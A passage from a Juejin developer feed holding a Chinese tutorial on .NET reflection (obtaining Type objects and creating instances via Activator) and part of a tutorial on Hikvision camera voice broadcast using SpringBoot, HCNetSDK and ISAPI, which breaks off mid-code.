itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            .NET进阶——深入理解反射（2）细说Type类型与实例创建
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1945461219656633/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我要拿微软MVP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T07:53:33.000Z" title="Sat Dec 06 2025 07:53:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、核心定义：<code>System.Type</code> 是什么？</h3>
<p><code>System.Type</code> 是 .NET 框架中 <strong>表示 “类型元数据” 的抽象基类</strong>。简单来说：Type就相当与是一个<code>具体类的图纸</code>。</p>
<p>比如当我写了这样的代码时：
<code>Type type = typeof(Person)</code>
就表示当前这个Type类型的type是对我Person类的一个抽象图纸。我们可以通过这个type来做很多事情，比如获取它的属性和方法等，尤其和泛型、属性等配合起来，会发挥出很强大的力量，后面会介绍更多。</p>
<h3 data-id="heading-1">二、如何获取 <code>Type</code> 对象？</h3>
<p>在 C# 中，有 3 种常用方式获取一个类型的 <code>Type</code> 实例：</p>
<h4 data-id="heading-2">1.直接通过<strong>类型名</strong>获取，无需实例，编译时检查有效性。</h4>
<pre><code class="hljs language-cs" lang="cs">Type intType = <span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">int</span>);  <span class="hljs-comment">// 获取 int 类型的 Type 对象</span>
Type stringType = <span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">string</span>);  <span class="hljs-comment">// 获取 string 类型的 Type 对象</span>
Type personType = <span class="hljs-keyword">typeof</span>(Person);  <span class="hljs-comment">// 获取自定义类 Person 的 Type 对象</span>
</code></pre>
<h4 data-id="heading-3">2. <code>GetType()</code> 方法（运行时通过实例获取）</h4>
<p>通过<strong>对象实例</strong>获取其实际类型（支持多态，返回运行时类型）。</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-built_in">string</span> str = <span class="hljs-string">"Hello"</span>;
Type type = str.GetType();  <span class="hljs-comment">// 返回 System.String</span>

Person person = <span class="hljs-keyword">new</span> Person();  
Type studentType = person.GetType();  <span class="hljs-comment">// 返回 Person </span>
</code></pre>
<h4 data-id="heading-4">3. <code>Assembly.GetType()</code>（动态加载程序集后获取）</h4>
<p>从外部 DLL（程序集）中动态加载类型（常用于插件系统）。</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment">// 加载外部 DLL</span>
Assembly assembly1 = Assembly.Load(<span class="hljs-string">"MyPlugin"</span>);           <span class="hljs-comment">// 不需要后缀</span>
Assembly assembly2 = Assembly.LoadFrom(<span class="hljs-string">"MyPlugin.dll"</span>);   <span class="hljs-comment">// 需要后缀</span>
Assembly assembly3 = Assembly.LoadFile(<span class="hljs-string">"D:\ASP.NET_quanzhan\csharp-advanced\Advanced_Refulaction_Methods\Advanced_Refulaction_Methods\bin\Debug\net8.0\MyPlugin.dll"</span>);   <span class="hljs-comment">//需要完整路径</span>

<span class="hljs-comment">// 通过assembly.GetType方法可以获取类型，参数必须要是命名空间.类名的完整名称</span>
Type pluginType = assembly.GetType(<span class="hljs-string">"MyPlugin.PluginClass"</span>);
</code></pre>
<h4 data-id="heading-5">4.<code>Type.GetType()</code>获取（自动搜索当前程序集，自动添加）</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment">// 语法：Type.GetType("完全限定名")</span>
Type stringType = Type.GetType(<span class="hljs-string">"System.String"</span>);  <span class="hljs-comment">// 返回 System.String</span>
Type intType = Type.GetType(<span class="hljs-string">"System.Int32"</span>);      <span class="hljs-comment">// 返回 System.Int32</span>

<span class="hljs-comment">// 语法：Type.GetType("完全限定名 , 程序集名称")</span>
Type personType = Type.GetType(<span class="hljs-string">"MyApp.Models.Person, MyApp"</span>);  <span class="hljs-comment">// 格式：命名空间.类名, 程序集名</span>
</code></pre>
<h4 data-id="heading-6">5.使用<code>实例名.GetType</code>时有个坑是需要注意的，来看下面的代码</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-built_in">object</span> obj = <span class="hljs-string">"123456"</span>;
Type type1 = obj.GetType();   <span class="hljs-comment">// 返回string</span>

Person p = <span class="hljs-keyword">new</span> Student();  <span class="hljs-comment">// Student类继承自Person类</span>
Type type2 = p.GetType();  <span class="hljs-comment">// 返回Student而非Person</span>
</code></pre>
<p>第一次看到这个结果大家可能有点吃惊，为什么会这样，原因是Type获取的是<code>运行时类型</code>，而<code>非编译时类型</code>。</p>























<table><thead><tr><th>类型</th><th>定义</th><th>确定时机</th><th>例子（<code>object obj = "Hello"</code>）</th></tr></thead><tbody><tr><td>编译时类型</td><td>变量<strong>声明时</strong>的类型（写代码时指定）</td><td>编译时</td><td><code>obj</code> 的编译时类型是 <code>object</code></td></tr><tr><td>运行时类型</td><td>对象<strong>实际创建</strong>时的类型（<code>new</code> 出来的类型）</td><td>运行时</td><td><code>obj</code> 的运行时类型是 <code>string</code></td></tr></tbody></table>
<p>所以，我们这里type返回的都是实际创建的实例，而非声明类型。</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-built_in">object</span> obj = <span class="hljs-string">"Hello"</span>;  <span class="hljs-comment">// 声明类型是 object，实际创建的是 string 实例</span>
Type type = obj.GetType();  <span class="hljs-comment">// 返回 System.String</span>
</code></pre>
<p>剩下两个方法typeof(Person)和assembly.GetType(“命名空间.类名”)这两个方法中，由于前一个是直接在编译时就获取了类型，所以前一个是编译时对象；而后一个由于要加载编译后的DLL文件，所以他是运行时对象。</p>
<pre><code class="hljs language-cs" lang="cs">    Object obj2 = <span class="hljs-string">"Hello"</span>;
    Type type5 = <span class="hljs-keyword">typeof</span>(Object);  <span class="hljs-comment">// 获取对象是Object类型</span>
</code></pre>
<h3 data-id="heading-7">三、获取Type后创建实例</h3>
<h4 data-id="heading-8">1.调用无参构造函数创建实例(最基础)</h4>
<p>当我们的对象只有一个无参构造函数时：</p>
<pre><code class="hljs language-cs" lang="cs">    Type type = <span class="hljs-keyword">typeof</span>(Person);
    Object instance = Activator.CreateInstance(type);

    <span class="hljs-comment">//由于用Activator。CreateInstance创建出来的对象时Object类型，所以需要转换</span>
    Person person = (Person)instance; 
    person.Name = <span class="hljs-string">"张三"</span>;     <span class="hljs-comment">// 可以使用属性了</span>
    person.Age = <span class="hljs-number">18</span>;
</code></pre>
<h4 data-id="heading-9">2.调用带参构造函数创建实例（有参数的情况下）</h4>
<p>当前的Person类有一个带参构造函数如下：</p>
<pre><code class="hljs language-cs" lang="cs">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>
    {
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Id { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>? Name { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>? Description { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Age { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }

        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> Name</span>)</span>
        {
            <span class="hljs-keyword">this</span>.Name = Name;
        }
    }
</code></pre>
<p>这种情况下，在创建实例时必须要给定参数：</p>
<pre><code class="hljs language-cs" lang="cs">    Type type = <span class="hljs-keyword">typeof</span>(Person);
    Object instance = Activator.CreateInstance(type,<span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>[] { <span class="hljs-string">"张三"</span> }); <span class="hljs-comment">// 使用object数组给定参数</span>

    Person person = (Person)instance;
    person.Age = <span class="hljs-number">18</span>;
</code></pre>
<h4 data-id="heading-10">3. 调用<strong>非公共构造函数</strong>（如私有构造函数）</h4>
<p><strong>语法</strong>：<code>Activator.CreateInstance(Type type, bool nonPublic)</code></p>
<p><strong>适用场景</strong>：类的构造函数是 <code>private</code> 或 <code>protected</code>（如单例模式的私有构造函数）。</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment">// 假设 Singleton 类有私有构造函数：private Singleton() { }</span>
Type singletonType = <span class="hljs-keyword">typeof</span>(Singleton);

<span class="hljs-comment">// 创建实例（允许调用非公共构造函数）</span>
Singleton instance = (Singleton)Activator.CreateInstance(singletonType, <span class="hljs-literal">true</span>);
</code></pre>
<h4 data-id="heading-11">4.泛型类型的实例创建（特殊情况）</h4>
<h4 data-id="heading-12">步骤：</h4>
<ol>
<li>获取泛型定义的 <code>Type</code>（如 <code>typeof(List&lt;&gt;)</code>）；</li>
<li>通过 <code>MakeGenericType()</code> 方法传入具体类型参数，生成具体泛型类型；</li>
<li>调用 <code>Activator.CreateInstance()</code> 创建实例。</li>
</ol>
<h4 data-id="heading-13">示例：创建 <code>List&lt;string&gt;</code> 实例</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment">// 1. 获取泛型定义：List&lt;&gt;（注意：&lt;&gt; 表示未指定类型参数的泛型定义）</span>
Type type = <span class="hljs-keyword">typeof</span>(List&lt;&gt;);

<span class="hljs-comment">// 2. 生成具体泛型类型：List&lt;string&gt;（传入 string 作为类型参数）</span>
Type GenericType = type.MakeGenericType(<span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">string</span>));

<span class="hljs-comment">// 3. 创建实例（相当于 new List&lt;string&gt;()）</span>
<span class="hljs-built_in">object</span> list = Activator.CreateInstance(GenericType);
List&lt;<span class="hljs-built_in">string</span>&gt; ListInstance = (List&lt;<span class="hljs-built_in">string</span>&gt;)list;

<span class="hljs-comment">// 4. 使用实例</span>
ListInstance.Add(<span class="hljs-string">"123"</span>);
ListInstance.Add(<span class="hljs-string">"你好"</span>);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[springboot+vue 如何实现海康摄像头喊话功能]]></title>    <link>https://juejin.cn/post/7580277964341428234</link>    <guid>https://juejin.cn/post/7580277964341428234</guid>    <pubDate>2025-12-06T08:13:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580277964341428234" data-draft-id="7580277964341411850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="springboot+vue  如何实现海康摄像头喊话功能"/> <meta itemprop="keywords" content="前端,后端,Vue.js"/> <meta itemprop="datePublished" content="2025-12-06T08:13:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT界Tony哥"/> <meta itemprop="url" content="https://juejin.cn/user/3157453122578087"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            springboot+vue  如何实现海康摄像头喊话功能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3157453122578087/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT界Tony哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T08:13:58.000Z" title="Sat Dec 06 2025 08:13:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我来为您介绍在SpringBoot + Vue项目中实现海康摄像头喊话功能的完整方案：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39d353c63cf24672bdb7a102eed6d7a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTnlYxUb2555ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765613638&amp;x-signature=p2JwZEzj25F7vwzaD6%2F%2Ffh4hJU8%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">一、技术架构</h2>
<pre><code class="hljs language-scss" lang="scss">前端(Vue) → 后端(SpringBoot) → 海康SDK/ISAPI → 海康摄像头
</code></pre>
<h2 data-id="heading-1">二、后端实现（SpringBoot）</h2>
<h3 data-id="heading-2">1. 添加依赖</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 可选：WebSocket支持实时语音流 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">2. 海康SDK集成（基于HCNetSDK）</h3>
<p><strong>VoiceBroadcastService.java</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VoiceBroadcastService</span> {
    
    <span class="hljs-comment">// 加载海康SDK</span>
    <span class="hljs-keyword">static</span> {
        System.loadLibrary(<span class="hljs-string">"hcnetsdk"</span>);
        System.loadLibrary(<span class="hljs-string">"PlayCtrl"</span>);
        System.loadLibrary(<span class="hljs-string">"HCNetSDK"</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">startBroadcast</span><span class="hljs-params">(String cameraIp, String text)</span> {
        <span class="hljs-type">HCNetSDK</span> <span class="hljs-variable">hCNetSDK</span> <span class="hljs-operator">=</span> HCNetSDK.INSTANCE;
        <span class="hljs-type">IntByReference</span> <span class="hljs-variable">loginHandle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntByReference</span>(<span class="hljs-number">0</span>);
        
        <span class="hljs-comment">// 1. 登录设备</span>
        HCNetSDK.<span class="hljs-type">NET_DVR_DEVICEINFO_V30</span> <span class="hljs-variable">deviceInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HCNetSDK</span>.NET_DVR_DEVICEINFO_V30();
        loginHandle.setValue(hCNetSDK.NET_DVR_Login_V30(
            cameraIp, (<span class="hljs-type">short</span>)<span class="hljs-number">8000</span>, <span class="hljs-string">"admin"</span>, <span class="hljs-string">"password"</span>, 
            deviceInfo, <span class="hljs-literal">null</span>
        ));
        
        <span class="hljs-keyword">if</span> (loginHandle.getValue() &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 2. 开启语音对讲</span>
            HCNetSDK.<span class="hljs-type">NET_DVR_VOICECOM_START</span> <span class="hljs-variable">voiceStart</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HCNetSDK</span>.NET_DVR_VOICECOM_START();
            voiceStart.dwSize = voiceStart.size();
            voiceStart.dwVoiceChan = <span class="hljs-number">1</span>; <span class="hljs-comment">// 通道号</span>
            voiceStart.byVoiceMode = <span class="hljs-number">0</span>; <span class="hljs-comment">// 0-客户端发起</span>
            
            <span class="hljs-type">int</span> <span class="hljs-variable">voiceHandle</span> <span class="hljs-operator">=</span> hCNetSDK.NET_DVR_StartVoiceCom_V30(
                loginHandle.getValue(), voiceStart, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>
            );
            
            <span class="hljs-keyword">if</span> (voiceHandle &lt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
            
            <span class="hljs-comment">// 3. 发送语音数据（这里需要音频输入）</span>
            <span class="hljs-comment">// 实际实现需要从麦克风获取音频流</span>
            
            <span class="hljs-comment">// 4. 停止对讲</span>
            hCNetSDK.NET_DVR_StopVoiceCom(voiceHandle);
            
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// 5. 注销登录</span>
            hCNetSDK.NET_DVR_Logout(loginHandle.getValue());
        }
    }
}
</code></pre>
<h3 data-id="heading-4">3. 基于ISAPI的文本转语音方案（推荐）</h3>
<p><strong>HikvisionISAPIService.java</strong></p>
<pre><code class="hljs language-ini" lang="ini">@Service
public class HikvisionISAPIService {
    
    @Value("${hikvision.username}")
    private String username<span class="hljs-comment">;</span>
    
    @Value("${hikvision.password}")
    private String password<span class="hljs-comment">;</span>
    
    /**
     * 文本转语音广播
     */
    public boolean textToSpeech(String cameraIp, String text) {
        String <span class="hljs-attr">url</span> = String.format(<span class="hljs-string">"http://%s/ISAPI/System/Audio/channels/1/audioData"</span>, cameraIp)<span class="hljs-comment">;</span>
        
        try {
            // 1. 构建语音数据（需要将文本转为G.711/G.726等格式）
            byte<span class="hljs-section">[]</span> <span class="hljs-attr">audioData</span> = convertTextToAudio(text)<span class="hljs-comment">;</span>
            
            // 2. 发送HTTP PUT请求
            HttpHeaders <span class="hljs-attr">headers</span> = new HttpHeaders()<span class="hljs-comment">;</span>
            headers.setBasicAuth(username, password)<span class="hljs-comment">;</span>
            headers.setContentType(MediaType.APPLICATION_OCTET_STREAM)<span class="hljs-comment">;</span>
            
            HttpEntity&lt;byte<span class="hljs-section">[]</span>&gt; <span class="hljs-attr">entity</span> = new HttpEntity&lt;&gt;(audioData, headers)<span class="hljs-comment">;</span>
            RestTemplate <span class="hljs-attr">restTemplate</span> = new RestTemplate()<span class="hljs-comment">;</span>
            
            ResponseEntity&lt;String&gt; <span class="hljs-attr">response</span> = restTemplate.exchange(
                url, HttpMethod.PUT, entity, String.class
            )<span class="hljs-comment">;</span>
            
            return response.getStatusCode() == HttpStatus.OK<span class="hljs-comment">;</span>
        } catch (Exception e) {
            e.printStackTrace()<span class="hljs-comment">;</span>
            return false<span class="hljs-comment">;</span>
        }
    }
    
    /**
     * 获取音频通道信息
     */
    public String getAudioChannels(String cameraIp) {
        String <span class="hljs-attr">url</span> = String.format(<span class="hljs-string">"http://%s/ISAPI/System/Audio/channels"</span>, cameraIp)<span class="hljs-comment">;</span>
        
        try {
